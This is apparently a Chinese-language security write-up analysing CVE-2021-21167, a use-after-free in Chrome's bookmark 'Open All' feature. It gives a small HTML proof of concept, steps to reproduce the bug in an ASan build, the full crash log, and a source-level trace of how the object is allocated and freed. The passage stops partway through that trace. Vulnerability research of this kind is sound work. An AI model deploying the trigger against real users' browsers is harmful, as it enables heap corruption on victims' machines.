CVE-2021-21167 分析
=================

一 漏洞概述
------

在 chrome 89.0.4389.72 版本前，远程攻击者可以通过 HTML 页面触发一个书签的 UAF 漏洞，导致堆损坏。详细信息如下：

[CVE - CVE-2021-21167](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-21167)

[1161144 - Security: UAF in Bookmark OpenAll - chromium](https://bugs.chromium.org/p/chromium/issues/detail?id=1161144)

二 漏洞复现
------

### 2.1 PoC

该漏洞 PoC 如下：

```html

<html>
<head>
   <button id="triggerButton">Trigger</button>
<s cript>
   triggerButton = document.querySelector('#triggerButton');
   triggerButton.addEventListener('click', async event => {
       setTimeout(()=>{window.close();},5000);
   });
</s cript>
</head>
</html>
```

### 2.2 漏洞复现

在[chromium-browser-asan](https://commondatastorage.googleapis.com/chromium-browser-asan/index.html)下载 asan 版本的 chrome，本文使用的是 win64 822987 版。运行浏览器，添加标签页，确保浏览器有15个以上的标签页。

将上节的 PoC 代码保存为 poc.html，在 poc 所在目录运行 python -m SimpleHTTPServer 搭建一个 http 服务器。

在 chrome 浏览器目录运行 chrome.exe "<http://localhost:8000/poc.html>" "about:blank" 打开一个新的浏览器界面，此时会打开两个标签页，PoC 标签页中有一个 trigger 按钮，如下：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-10443847d339c46d9f322484744f2e13798b3024.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-10443847d339c46d9f322484744f2e13798b3024.png)

单击 Trigger，然后右键单击工具栏，选择打开所有标签页，此时会弹出一个对话框，询问用户是否要打开所有标签页：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5415f043b9efd4b589e0e45d76b1cdc0212ea97b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5415f043b9efd4b589e0e45d76b1cdc0212ea97b.png)

在 poc 页面关闭后单击是，此时 asan 版的 chrome 会崩溃并打印 UAF 信息，如下所示：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-635c4a55889cdb4ab76c4e638cc2e4468f17272e.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-635c4a55889cdb4ab76c4e638cc2e4468f17272e.png)

### 2.3 asan 报错

windows 下 822987 版本 chrome(asan 版) 报错如下：

```asan
=================================================================
==31020==ERROR: AddressSanitizer: heap-use-after-free on address 0x124013e2f080 at pc 0x7ffc40f0ccf6 bp 0x0057c39fdac0 sp 0x0057c39fdb08
READ of size 8 at 0x124013e2f080 thread T0
    #0 0x7ffc40f0ccf5 in chrome::OpenAll(class aura::Window *, class content::PageNavigator *, class std::__1::vector<class bookmarks::BookmarkNode const *, class std::__1::allocator<class bookmarks::BookmarkNode const *>> const &, enum WindowOpenDisposition, class content::BrowserContext *) C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\bookmarks\bookmark_utils_desktop.cc:129:51
    #1 0x7ffc48016d27 in BookmarkContextMenuController::ExecuteCommand(int, int) C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\bookmarks\bookmark_context_menu_controller.cc:220:7
    #2 0x7ffc43f95c57 in views::internal::MenuRunnerImpl::OnMenuClosed(enum views::internal::MenuControllerDelegate::NotifyType, class views::MenuItemView *, int) C:\b\s\w\ir\cache\builder\src\ui\views\controls\menu\menu_runner_impl.cc:244:29
    #3 0x7ffc463de080 in views::MenuController::ExitMenu(void) C:\b\s\w\ir\cache\builder\src\ui\views\controls\menu\menu_controller.cc:3003:13
    #4 0x7ffc463e2a51 in views::MenuController::OnMouseReleased(class views::SubmenuView *, class ui::MouseEvent const &) C:\b\s\w\ir\cache\builder\src\ui\views\controls\menu\menu_controller.cc:817:7
    #5 0x7ffc39f61ae2 in views::Widget::OnMouseEvent(class ui::MouseEvent *) C:\b\s\w\ir\cache\builder\src\ui\views\widget\widget.cc:1307:20
    #6 0x7ffc3ad26771 in ui::EventDispatcher::DispatchEvent(class ui::EventHandler *, class ui::Event *) C:\b\s\w\ir\cache\builder\src\ui\events\event_dispatcher.cc:191:12
    #7 0x7ffc3ad25c69 in ui::EventDispatcher::ProcessEvent(class ui::EventTarget *, class ui::Event *) C:\b\s\w\ir\cache\builder\src\ui\events\event_dispatcher.cc:140:5
    #8 0x7ffc3ad25623 in ui::EventDispatcherDelegate::DispatchEventToTarget(class ui::EventTarget *, class ui::Event *) C:\b\s\w\ir\cache\builder\src\ui\events\event_dispatcher.cc:84:14
    #9 0x7ffc3ad25260 in ui::EventDispatcherDelegate::DispatchEvent(class ui::EventTarget *, class ui::Event *) C:\b\s\w\ir\cache\builder\src\ui\events\event_dispatcher.cc:56:15
    #10 0x7ffc3f123654 in ui::EventProcessor::OnEventFromSource(class ui::Event *) C:\b\s\w\ir\cache\builder\src\ui\events\event_processor.cc:49:17
    #11 0x7ffc3c4cffdd in ui::EventSource::DeliverEventToSink(class ui::Event *) C:\b\s\w\ir\cache\builder\src\ui\events\event_source.cc:113:16
    #12 0x7ffc3c4cfc43 in ui::EventSource::SendEventToSinkFromRewriter(class ui::Event const *, class ui::EventRewriter const *) C:\b\s\w\ir\cache\builder\src\ui\events\event_source.cc:138:12
    #13 0x7ffc3c4cf743 in ui::EventSource::SendEventToSink(class ui::Event const *) C:\b\s\w\ir\cache\builder\src\ui\events\event_source.cc:107:10
    #14 0x7ffc3f0f953d in views::DesktopWindowTreeHostWin::HandleMouseEvent(class ui::MouseEvent *) C:\b\s\w\ir\cache\builder\src\ui\views\widget\desktop_aura\desktop_window_tree_host_win.cc:949:3
    #15 0x7ffc42dbe3c5 in views::HWNDMessageHandler::HandleMouseEventInternal(unsigned int, unsigned __int64, __int64, bool) C:\b\s\w\ir\cache\builder\src\ui\views\win\hwnd_message_handler.cc:3111:26
    #16 0x7ffc42db78bb in views::HWNDMessageHandler::_ProcessWindowMessage(struct HWND__*, unsigned int, unsigned __int64, __int64, __int64 &, unsigned long) C:\b\s\w\ir\cache\builder\src\ui\views\win\hwnd_message_handler.h:357:5
    #17 0x7ffc42db6ebf in views::HWNDMessageHandler::OnWndProc(unsigned int, unsigned __int64, __int64) C:\b\s\w\ir\cache\builder\src\ui\views\win\hwnd_message_handler.cc:1011:7
    #18 0x7ffc3cc827d6 in gfx::WindowImpl::WndProc(struct HWND__*, unsigned int, unsigned __int64, __int64) C:\b\s\w\ir\cache\builder\src\ui\gfx\win\window_impl.cc:308:18
    #19 0x7ffc3cc812e7 in b ase::win::WrappedWindowProc<&gfx::WindowImpl::WndProc(struct HWND__*, unsigned int, unsigned __int64, __int64)>(struct HWND__*, unsigned int, unsigned __int64, __int64) C:\b\s\w\ir\cache\builder\src\b ase\win\wrapped_window_proc.h:74:10
    #20 0x7ffcda42e857  (C:\WINDOWS\System32\user32.dll+0x18000e857)
    #21 0x7ffcda42e298  (C:\WINDOWS\System32\user32.dll+0x18000e298)
    #22 0x7ffc3a162cd5 in b ase::MessagePumpForUI::ProcessMessageHelper(struct tagMSG const &) C:\b\s\w\ir\cache\builder\src\b ase\message_loop\message_pump_win.cc:534:3
    #23 0x7ffc3a160522 in b ase::MessagePumpForUI::ProcessNextWindowsMessage(void) C:\b\s\w\ir\cache\builder\src\b ase\message_loop\message_pump_win.cc:501:31
    #24 0x7ffc3a15fe3c in b ase::MessagePumpForUI::DoRunLoop(void) C:\b\s\w\ir\cache\builder\src\b ase\message_loop\message_pump_win.cc:219:35
    #25 0x7ffc3a15daef in b ase::MessagePumpWin::Run(class b ase::MessagePump::Delegate *) C:\b\s\w\ir\cache\builder\src\b ase\message_loop\message_pump_win.cc:80:3
    #26 0x7ffc3c60dfb3 in b ase::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, class b ase::TimeDelta) C:\b\s\w\ir\cache\builder\src\b ase\task\sequence_manager\thread_controller_with_message_pump_impl.cc:446:12
    #27 0x7ffc3a069361 in b ase::RunLoop::Run(void) C:\b\s\w\ir\cache\builder\src\b ase\run_loop.cc:124:14
    #28 0x7ffc3c743d59 in ChromeBrowserMainParts::MainMessageLoopRun(int *) C:\b\s\w\ir\cache\builder\src\chrome\browser\chrome_browser_main.cc:1711:15
    #29 0x7ffc341a309d in content::BrowserMainLoop::RunMainMessageLoopParts(void) C:\b\s\w\ir\cache\builder\src\content\browser\browser_main_loop.cc:1019:29
    #30 0x7ffc341a8d0b in content::BrowserMainRunnerImpl::Run(void) C:\b\s\w\ir\cache\builder\src\content\browser\browser_main_runner_impl.cc:150:15
    #31 0x7ffc3419b4f6 in content::BrowserMain(struct content::MainFunctionParams const &) C:\b\s\w\ir\cache\builder\src\content\browser\browser_main.cc:47:28
    #32 0x7ffc39e4a1f5 in content::RunBrowserProcessMain(struct content::MainFunctionParams const &, class content::ContentMainDelegate *) C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:520:10
    #33 0x7ffc39e4c9db in content::ContentMainRunnerImpl::RunServiceManager(struct content::MainFunctionParams &, bool) C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:1005:10
    #34 0x7ffc39e4bd65 in content::ContentMainRunnerImpl::Run(bool) C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:880:12
    #35 0x7ffc39e48b87 in content::RunContentProcess(struct content::ContentMainParams const &, class content::ContentMainRunner *) C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc:372:36
    #36 0x7ffc39e4915b in content::ContentMain(struct content::ContentMainParams const &) C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc:398:10
    #37 0x7ffc30c61449 in ChromeMain C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_main.cc:130:12
    #38 0x7ff68e675b76 in MainDllLoader::Launch(struct HINSTANCE__*, class b ase::TimeTicks) C:\b\s\w\ir\cache\builder\src\chrome\app\main_dll_loader_win.cc:169:12
    #39 0x7ff68e672a46 in main C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_exe_main_win.cc:345:20
    #40 0x7ff68ea5783f in __scrt_common_main_seh d:\A01\_work\6\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:288
    #41 0x7ffcdaaf7033  (C:\WINDOWS\System32\KERNEL32.DLL+0x180017033)
    #42 0x7ffcdbdc2650  (C:\WINDOWS\SYSTEM32\ntdll.dll+0x180052650)

0x124013e2f080 is located 0 bytes inside of 2584-byte region [0x124013e2f080,0x124013e2fa98)
freed by thread T0 here:
    #0 0x7ff68e715314 in free C:\b\s\w\ir\cache\builder\src\third_party\llvm\compiler-rt\lib\asan\asan_malloc_win.cpp:82
    #1 0x7ffc3515686f in content::WebContentsImpl::`scalar deleting dtor'(unsigned int) C:\b\s\w\ir\cache\builder\src\content\browser\web_contents\web_contents_impl.cc:867:37
    #2 0x7ffc3e242def in TabStripModel::SendDetachWebContentsNotifications(struct TabStripModel::DetachNotifications *) C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\tabs\tab_strip_model.cc:544:21
    #3 0x7ffc3e259913 in TabStripModel::CloseWebContentses(class b ase::span<class content::WebContents *const, -1>, unsigned int) C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\tabs\tab_strip_model.cc:1799:5
    #4 0x7ffc3e248775 in TabStripModel::InternalCloseTabs(class b ase::span<class content::WebContents *const, -1>, unsigned int) C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\tabs\tab_strip_model.cc:1713:27
    #5 0x7ffc3e248db1 in TabStripModel::CloseWebContentsAt(int, unsigned int) C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\tabs\tab_strip_model.cc:741:10
    #6 0x7ffc35134d25 in content::WebContentsImpl::Close(class content::RenderViewHost *) C:\b\s\w\ir\cache\builder\src\content\browser\web_contents\web_contents_impl.cc:7009:16
    #7 0x7ffc32ed4f2a in b l ink::mojom::LocalMainF rameHostStubDispatch::Accept(class b l ink::mojom::LocalMainF rameHost *, class mojo::Message *) C:\b\s\w\ir\cache\builder\src\out\Release_x64\gen\third_party\b l ink\public\mojom\F rame\F rame.mojom.cc:15967:13
    #8 0x7ffc3a4d1f29 in mojo::InterfaceEndpointClient::Handle ValidatedMessage(class mojo::Message *) C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\interface_endpoint_client.cc:554:54
    #9 0x7ffc3ca79aa9 in mojo::MessageDispatcher::Accept(class mojo::Message *) C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\message_dispatcher.cc:46:24
    #10 0x7ffc3d24a017 in IPC::`anonymous namespace'::ChannelAssociatedGroupController::AcceptOnProxyThread C:\b\s\w\ir\cache\builder\src\ipc\ipc_mojo_bootstrap.cc:945:24
    #11 0x7ffc3d244017 in b ase::internal::Invoker<b ase::internal::BindState<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::*)(mojo::Message),scoped_refptr<IPC::(anonymous namespace)::ChannelAssociatedGroupController>,mojo::Message>,void ()>::RunOnce C:\b\s\w\ir\cache\builder\src\b ase\bind_internal.h:679:12
    #12 0x7ffc3a0b5f19 in b ase::TaskAnnotator::RunTask(char const *, struct b ase::PendingTask *) C:\b\s\w\ir\cache\builder\src\b ase\task\common\task_annotator.cc:163:33
    #13 0x7ffc3c60bc58 in b ase::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(class b ase::sequence_manager::LazyNow *) C:\b\s\w\ir\cache\builder\src\b ase\task\sequence_manager\thread_controller_with_message_pump_impl.cc:332:23
    #14 0x7ffc3c60b23a in b ase::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork(void) C:\b\s\w\ir\cache\builder\src\b ase\task\sequence_manager\thread_controller_with_message_pump_impl.cc:252:36
    #15 0x7ffc3a15fee0 in b ase::MessagePumpForUI::DoRunLoop(void) C:\b\s\w\ir\cache\builder\src\b ase\message_loop\message_pump_win.cc:224:63
    #16 0x7ffc3a15daef in b ase::MessagePumpWin::Run(class b ase::MessagePump::Delegate *) C:\b\s\w\ir\cache\builder\src\b ase\message_loop\message_pump_win.cc:80:3
    #17 0x7ffc3c60dfb3 in b ase::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, class b ase::TimeDelta) C:\b\s\w\ir\cache\builder\src\b ase\task\sequence_manager\thread_controller_with_message_pump_impl.cc:446:12
    #18 0x7ffc3a069361 in b ase::RunLoop::Run(void) C:\b\s\w\ir\cache\builder\src\b ase\run_loop.cc:124:14
    #19 0x7ffc3f2ec837 in MessageBoxDialog::Show(class aura::Window *, class std::__1::basic_string<wchar_t, struct std::__1::char_traits<wchar_t>, class std::__1::allocator<wchar_t>> const &, class std::__1::basic_string<wchar_t, struct std::__1::char_traits<wchar_t>, class std::__1::allocator<wchar_t>> const &, enum chrome::MessageBoxType, class std::__1::basic_string<wchar_t, struct std::__1::char_traits<wchar_t>, class std::__1::allocator<wchar_t>> const &, class std::__1::basic_string<wchar_t, struct std::__1::char_traits<wchar_t>, class std::__1::allocator<wchar_t>> const &, class std::__1::basic_string<wchar_t, struct std::__1::char_traits<wchar_t>, class std::__1::allocator<wchar_t>> const &, class b ase::OnceCallback<(enum chrome::MessageBoxResult)>) C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\views\message_box_dialog.cc:103:12
    #20 0x7ffc3f2ee67d in chrome::ShowQuestionMessageBox(class aura::Window *, class std::__1::basic_string<wchar_t, struct std::__1::char_traits<wchar_t>, class std::__1::allocator<wchar_t>> const &, class std::__1::basic_string<wchar_t, struct std::__1::char_traits<wchar_t>, class std::__1::allocator<wchar_t>> const &) C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\views\message_box_dialog.cc:320:10
    #21 0x7ffc40f0c8d1 in chrome::OpenAll(class aura::Window *, class content::PageNavigator *, class std::__1::vector<class bookmarks::BookmarkNode const *, class std::__1::allocator<class bookmarks::BookmarkNode const *>> const &, enum WindowOpenDisposition, class content::BrowserContext *) C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\bookmarks\bookmark_utils_desktop.cc:113:8
    #22 0x7ffc48016d27 in BookmarkContextMenuController::ExecuteCommand(int, int) C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\bookmarks\bookmark_context_menu_controller.cc:220:7
    #23 0x7ffc43f95c57 in views::internal::MenuRunnerImpl::OnMenuClosed(enum views::internal::MenuControllerDelegate::NotifyType, class views::MenuItemView *, int) C:\b\s\w\ir\cache\builder\src\ui\views\controls\menu\menu_runner_impl.cc:244:29
    #24 0x7ffc463de080 in views::MenuController::ExitMenu(void) C:\b\s\w\ir\cache\builder\src\ui\views\controls\menu\menu_controller.cc:3003:13
    #25 0x7ffc463e2a51 in views::MenuController::OnMouseReleased(class views::SubmenuView *, class ui::MouseEvent const &) C:\b\s\w\ir\cache\builder\src\ui\views\controls\menu\menu_controller.cc:817:7
    #26 0x7ffc39f61ae2 in views::Widget::OnMouseEvent(class ui::MouseEvent *) C:\b\s\w\ir\cache\builder\src\ui\views\widget\widget.cc:1307:20
    #27 0x7ffc3ad26771 in ui::EventDispatcher::DispatchEvent(class ui::EventHandler *, class ui::Event *) C:\b\s\w\ir\cache\builder\src\ui\events\event_dispatcher.cc:191:12
    #28 0x7ffc3ad25c69 in ui::EventDispatcher::ProcessEvent(class ui::EventTarget *, class ui::Event *) C:\b\s\w\ir\cache\builder\src\ui\events\event_dispatcher.cc:140:5

previously allocated by thread T0 here:
    #0 0x7ff68e715414 in malloc C:\b\s\w\ir\cache\builder\src\third_party\llvm\compiler-rt\lib\asan\asan_malloc_win.cpp:98
    #1 0x7ffc4b42597a in operator new(unsigned __int64) d:\A01\_work\6\s\src\vctools\crt\vcstartup\src\heap\new_scalar.cpp:35
    #2 0x7ffc350a8def in content::WebContentsImpl::CreateWithOpener(struct content::WebContents::CreateParams const &, class content::RenderF rameHostImpl *) C:\b\s\w\ir\cache\builder\src\content\browser\web_contents\web_contents_impl.cc:1000:7
    #3 0x7ffc350a8c3a in content::WebContentsImpl::Create(struct content::WebContents::CreateParams const &) C:\b\s\w\ir\cache\builder\src\content\browser\web_contents\web_contents_impl.cc:516:10
    #4 0x7ffc350a8b43 in content::WebContents::Create(struct content::WebContents::CreateParams const &) C:\b\s\w\ir\cache\builder\src\content\browser\web_contents\web_contents_impl.cc:511:10
    #5 0x7ffc3c127548 in Navigate(struct NavigateParams *) C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\browser_navigator.cc:630:28
    #6 0x7ffc4321e842 in StartupBrowserCreatorImpl::OpenTabsInBrowser(class Browser *, bool, class std::__1::vector<struct StartupTab, class std::__1::allocator<struct StartupTab>> const &) C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\startup_browser_creator_impl.cc:319:5
    #7 0x7ffc43220d8f in StartupBrowserCreatorImpl::RestoreOrCreateBrowser(class std::__1::vector<struct StartupTab, class std::__1::allocator<struct StartupTab>> const &, enum StartupBrowserCreatorImpl::BrowserOpenBehavior, unsigned int, bool, bool) C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\startup_browser_creator_impl.cc:626:13
    #8 0x7ffc4321dbf8 in StartupBrowserCreatorImpl::DetermineURLsAndLaunch(bool, class std::__1::vector<class GURL, class std::__1::allocator<class GURL>> const &) C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\startup_browser_creator_impl.cc:490:22
    #9 0x7ffc4321c729 in StartupBrowserCreatorImpl::Launch(class Profile *, class std::__1::vector<class GURL, class std::__1::allocator<class GURL>> const &, bool, class std::__1::unique_ptr<class LaunchModeRecorder, struct std::__1::default_delete<class LaunchModeRecorder>>) C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\startup_browser_creator_impl.cc:231:5
    #10 0x7ffc3f350b7a in StartupBrowserCreator::LaunchBrowser(class b ase::CommandLine const &, class Profile *, class b ase::FilePath const &, enum chrome::startup::IsProcessStartup, enum chrome::startup::IsFirstRun, class std::__1::unique_ptr<class LaunchModeRecorder, struct std::__1::default_delete<class LaunchModeRecorder>>) C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\startup_browser_creator.cc:445:13
    #11 0x7ffc3f355c19 in StartupBrowserCreator::ProcessLastOpenedProfiles(class b ase::CommandLine const &, class b ase::FilePath const &, enum chrome::startup::IsProcessStartup, enum chrome::startup::IsFirstRun, class Profile *, class std::__1::vector<class Profile *, class std::__1::allocator<class Profile *>> const &) C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\startup_browser_creator.cc:997:10
    #12 0x7ffc3f35520a in StartupBrowserCreator::LaunchBrowserForLastProfiles(class b ase::CommandLine const &, class b ase::FilePath const &, bool, class Profile *, class std::__1::vector<class Profile *, class std::__1::allocator<class Profile *>> const &) C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\startup_browser_creator.cc:947:10
    #13 0x7ffc3f3501bb in StartupBrowserCreator::ProcessCmdLineImpl(class b ase::CommandLine const &, class b ase::FilePath const &, bool, class Profile *, class std::__1::vector<class Profile *, class std::__1::allocator<class Profile *>> const &) C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\startup_browser_creator.cc:886:10
    #14 0x7ffc3f34ead4 in StartupBrowserCreator::Start(class b ase::CommandLine const &, class b ase::FilePath const &, class Profile *, class std::__1::vector<class Profile *, class std::__1::allocator<class Profile *>> const &) C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\startup_browser_creator.cc:399:10
    #15 0x7ffc3c741973 in ChromeBrowserMainParts::PreMainMessageLoopRunImpl(void) C:\b\s\w\ir\cache\builder\src\chrome\browser\chrome_browser_main.cc:1620:25
    #16 0x7ffc3c73ee2e in ChromeBrowserMainParts::PreMainMessageLoopRun(void) C:\b\s\w\ir\cache\builder\src\chrome\browser\chrome_browser_main.cc:1033:18
    #17 0x7ffc341a2d0a in content::BrowserMainLoop::PreMainMessageLoopRun(void) C:\b\s\w\ir\cache\builder\src\content\browser\browser_main_loop.cc:993:13
    #18 0x7ffc3500843f in content::StartupTaskRunner::RunAllTasksNow(void) C:\b\s\w\ir\cache\builder\src\content\browser\startup_task_runner.cc:41:29
    #19 0x7ffc3419f933 in content::BrowserMainLoop::CreateStartupTasks(void) C:\b\s\w\ir\cache\builder\src\content\browser\browser_main_loop.cc:903:25
    #20 0x7ffc341a813b in content::BrowserMainRunnerImpl::Initialize(struct content::MainFunctionParams const &) C:\b\s\w\ir\cache\builder\src\content\browser\browser_main_runner_impl.cc:129:15
    #21 0x7ffc3419b4a8 in content::BrowserMain(struct content::MainFunctionParams const &) C:\b\s\w\ir\cache\builder\src\content\browser\browser_main.cc:43:32
    #22 0x7ffc39e4a1f5 in content::RunBrowserProcessMain(struct content::MainFunctionParams const &, class content::ContentMainDelegate *) C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:520:10
    #23 0x7ffc39e4c9db in content::ContentMainRunnerImpl::RunServiceManager(struct content::MainFunctionParams &, bool) C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:1005:10
    #24 0x7ffc39e4bd65 in content::ContentMainRunnerImpl::Run(bool) C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:880:12
    #25 0x7ffc39e48b87 in content::RunContentProcess(struct content::ContentMainParams const &, class content::ContentMainRunner *) C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc:372:36
    #26 0x7ffc39e4915b in content::ContentMain(struct content::ContentMainParams const &) C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc:398:10
    #27 0x7ffc30c61449 in ChromeMain C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_main.cc:130:12
    #28 0x7ff68e675b76 in MainDllLoader::Launch(struct HINSTANCE__*, class b ase::TimeTicks) C:\b\s\w\ir\cache\builder\src\chrome\app\main_dll_loader_win.cc:169:12

SUMMARY: AddressSanitizer: heap-use-after-free C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\bookmarks\bookmark_utils_desktop.cc:129:51 in chrome::OpenAll(class aura::Window *, class content::PageNavigator *, class std::__1::vector<class bookmarks::BookmarkNode const *, class std::__1::allocator<class bookmarks::BookmarkNode const *>> const &, enum WindowOpenDisposition, class content::BrowserContext *)
Shadow bytes around the buggy address:
  0x044c165c5dc0: 04 fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x044c165c5dd0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x044c165c5de0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x044c165c5df0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x044c165c5e00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x044c165c5e10:[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x044c165c5e20: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x044c165c5e30: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x044c165c5e40: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x044c165c5e50: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x044c165c5e60: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra o bject redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==31020==ABORTING
```

### 2.3 UAF 对象分析

#### 2.3.1 对象分配

在浏览器打开时会调用`StartupBrowserCreatorImpl::OpenTabsInBrowser`函数创建 tab，该函数会创建`Navigate`对象并最终调用`WebContentsImpl`创建一个`WebContentsImpl`对象，调用如下所示：

```cpp
//chrome/browser/ui/startup/startup_browser_creator_impl.cc
Browser* StartupBrowserCreatorImpl::OpenTabsInBrowser(Browser* browser,
                                                      bool process_startup,
                                                      const StartupTabs& tabs) {
//---snip---
    Navigate(&params);
//---snip---
}

//chrome/browser/ui/browser_navigator.cc
void Navigate(NavigateParams* params) {
//---snip---
if (params->disposition != WindowOpenDisposition::CURRENT_TAB) {
      contents_to_insert = CreateTargetContents(*params, params->url);
      contents_to_navigate_or_insert = contents_to_insert.get();
    } 
//---snip
}

std::unique_ptr<content::WebContents> CreateTargetContents(
    const NavigateParams& params,
    const GURL& url) {
//---snip---
    std::unique_ptr<WebContents> target_contents =
      WebContents::Create(create_params);
//---snip---
}

//content/browser/web_contents/web_contents_impl.cc
std::unique_ptr<WebContents> WebContents::Create(
    const WebContents::CreateParams& params) {
  return WebContentsImpl::Create(params);
}

std::unique_ptr<WebContentsImpl> WebContentsImpl::Create(
    const CreateParams& params) {
  return CreateWithOpener(params, FindOpenerRFH(params));
}

std::unique_ptr<WebContentsImpl> WebContentsImpl::CreateWithOpener(
    const WebContents::CreateParams& params,
    RenderF rameHostImpl* opener_rfh) {
//---snip---
  std::unique_ptr<WebContentsImpl> new_contents(
      new WebContentsImpl(params.browser_context));
//---snip---
    return new_contents
}
```

从上面的代码可以看出在`WebContentsImpl::CreateWithOpener`函数中创建的`WebContentsImpl`对象会保存在`Navigate`构造函数的`contents_to_insert`变量中。`Navigate`随后会调用相关函数，将`WebContentsImpl`对象保存到`TabStripModel`对象的`contents_data_`变量中，如下所示：

```cpp
//chrome/browser/ui/browser_navigator.cc
void Navigate(NavigateParams* params) {
//---snip---
    params->browser->tab_strip_model()->AddWebContents(
        std::move(contents_to_insert), params->tabstrip_index,
        params->transition, params->tabstrip_add_types, params->group);
//---snip---
}

//chrome/browser/ui/tab_strip_model.cc
void TabStripModel::AddWebContents(
    std::unique_ptr<WebContents> contents,
    int index,
    ui::PageTransition transition,
    int add_types,
    b ase::Optional<tab_groups::TabGroupId> group) {
 //---snip---
    InsertWebContentsAtImpl(index, std::move(contents),
                          add_types | (inherit_opener ? ADD_INHERIT_OPENER : 0),
                          group);
//---snip---
}

int TabStripModel::InsertWebContentsAtImpl(
    int index,
    std::unique_ptr<content::WebContents> contents,
    int add_types,
    b ase::Optional<tab_groups::TabGroupId> group) {
//---snip---
  contents_data_.insert(contents_data_.begin() + index, std::move(data));
//---snip---
}
```

#### 2.3.2 对象释放

在 poc 调用`window.close()`函数后，相关消息通过 IPC 机制进行发送最终通过`content::WebContentsImpl::Close`函数关闭相关页面，如下所示：

```cpp
//content/browser/web_contents/web_contents_impl.cc
void WebContentsImpl::Close(RenderViewHost* rvh) {
//---snip---
    delegate_->CloseContents(this);
}

//chrome/browser/ui/browser.cc
void Browser::CloseContents(WebContents* source) {
  if (unload_controller_.CanCloseContents(source))
    chrome::CloseWebContents(this, source, true);
}

//chrome/browser/ui/browser_tabstrip.cc
void CloseWebContents(Browser* browser,
                      content::WebContents* contents,
                      bool add_to_history) {
  int index = browser->tab_strip_model()->GetIndexOfWebContents(contents);
  if (index == TabStripModel::kNoTab) {
    NOTREACHED() << "CloseWebContents called for tab not in our strip";
    return;
  }

  browser->tab_strip_model()->CloseWebContentsAt(
      index, add_to_history ? TabStripModel::CLOSE_CREATE_HISTORICAL_TAB
                            : TabStripModel::CLOSE_NONE);
}

//chrome/browser/ui/tabs/tab_strip_model.cc
bool TabStripModel::CloseWebContentsAt(int index, uint32_t close_types) {
  DCHECK(ContainsIndex(index));
  WebContents* contents = GetWebContentsAt(index);
  return InternalCloseTabs(b ase::span<WebContents* const>(&contents, 1),
                           close_types);
}

bool TabStripModel::InternalCloseTabs(
    b ase::span<content::WebContents* const> items,
    uint32_t close_types) {
//---snip---
  const bool closed_all = CloseWebContentses(items, close_types);
//---snip---
}

bool TabStripModel::CloseWebContentses(
    b ase::span<content::WebContents* const> items,
